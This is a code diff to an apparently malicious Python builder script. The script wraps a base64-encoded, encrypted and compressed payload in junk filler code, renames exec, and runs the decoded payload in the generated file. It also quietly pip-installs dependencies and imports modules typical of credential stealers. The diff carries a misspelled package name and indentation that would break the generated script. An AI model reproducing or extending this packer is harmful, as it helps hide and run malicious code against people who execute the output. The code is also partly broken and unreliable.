@@ -156,8 +156,16 @@ try:
     import cryptography
 except:
     subprocess.run('python -m pip install cryptography')
-
-from Crypto.Cipher import AES
+    
+ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
+for module in ModuleRequirements:
+    try:        
+        __import__(module[0])
+    except:
+        try:
+            subprocess.Popen(executable + " -m pip install pycrytodome --quiet", shell=True)
+        except:
+            subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
 
 import requests
 
@@ -182,8 +190,58 @@ decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
     name = args.name+'.py'
     s = base64.b64encode(obfuscated_code.encode('utf-8'))
     aw = random_class_name()    
+    '''     
+    for module in ModuleRequirements:\ntry:        __import__(module[0])\n    except:\n        try:\n            subprocess.Popen(executable + " -m pip install pycrytodome --quiet", shell=True)\n    except:\n        subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
+    '''
     with open(f'{BUILD_PATH}/{name}', "w+") as obfu_file:
-        obfu_file.write(f'from sys import executable, stderr\n{all_fake_code}\nimport ctypes;import base64,subprocess,sqlite3,json,shutil\nimport time\nModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]\nfor module in ModuleRequirements:\n    try:        __import__(module[0])\n    except:\n        try:\n            subprocess.Popen(executable + " -m pip install pycrytodome --quiet", shell=True)\n        except:\n            subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)\nfrom Crypto.Cipher import AES\nfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:import cryptography\nexcept:subprocess.run("python -m pip install cryptography")\ntry:\n    from cryptography.fernet import Fernet\nexcept:\n    subprocess.run("python -m pip install cryptography", shell=True)\ntry:import requests\nexcept:subprocess.run("python -m pip install requests", shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run("python -m pip install Crypto.Cipher", shell=True)\nfrom Crypto.Cipher import AES\nfrom cryptography.fernet import Fernet \n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\n{aw}="{s.decode("utf-8")}"\n{e}(base64.b64decode({aw}))\n{all_fake_code}') 
+        obfu_file.write(f'''
+                        from sys import executable, stderr
+                        {all_fake_code}
+                        import ctypes;import base64,subprocess,sqlite3,json,shutil
+                        import time
+                        ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
+                        for module in ModuleRequirements:
+                            try:        
+                                __import__(module[0])
+                            except:
+                                try:
+                                    subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
+                                except:
+                                    subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
+                        
+                        from Crypto.Cipher import AES
+                        from json import loads, dumps
+                        from urllib.request import Request, urlopen
+                        try:
+                            import cryptography
+                        except:
+                            subprocess.run("python -m pip install cryptography")
+                        
+                        try:
+                            from cryptography.fernet import Fernet
+                        except:
+                            subprocess.run("python -m pip install cryptography", shell=True)
+                        
+                        try:
+                            import requests
+                        except:
+                            subprocess.run("python -m pip install requests", shell=True)
+                        
+                        try:
+                            from Crypto.Cipher import AES
+                        except:
+                            subprocess.run("python -m pip install Crypto.Cipher", shell=True)
+                            
+                        from Crypto.Cipher import AES
+                        
+                        from cryptography.fernet import Fernet
+                        {all_fake_code}
+                        {e} = exec
+                        {all_fake_code}
+                        import concurrent.futures
+                        {aw}="{s.decode("utf-8")}"
+                        {e}(base64.b64decode({aw}))
+                        {all_fake_code}''') 
 
     obfuscated_file_path = os.path.join(BUILD_PATH, f"{name}")
         # Clean up
